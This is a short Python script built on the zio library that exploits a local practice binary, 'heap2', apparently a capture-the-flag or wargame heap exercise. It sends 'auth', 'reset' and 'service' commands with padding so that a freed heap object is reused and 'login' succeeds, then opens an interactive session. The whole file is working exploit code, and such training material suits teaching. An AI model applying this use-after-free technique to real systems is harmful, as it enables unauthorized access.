from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './heap2'

io      = zio(target, print_read = c_read, print_write = c_write)

def auth(payload):
    io.read_until(']')
    io.writeline('auth ' + payload)

def reset():
    io.read_until(']')
    io.writeline('reset')

def service(payload):
    io.read_until(']')
    io.writeline('service' + payload)

def login():
    io.read_until(']')
    io.writeline('login')
     
auth('A' * 0x20)
reset()
service('A' * 0x20 + l32(0x1))
login()

io.interact()
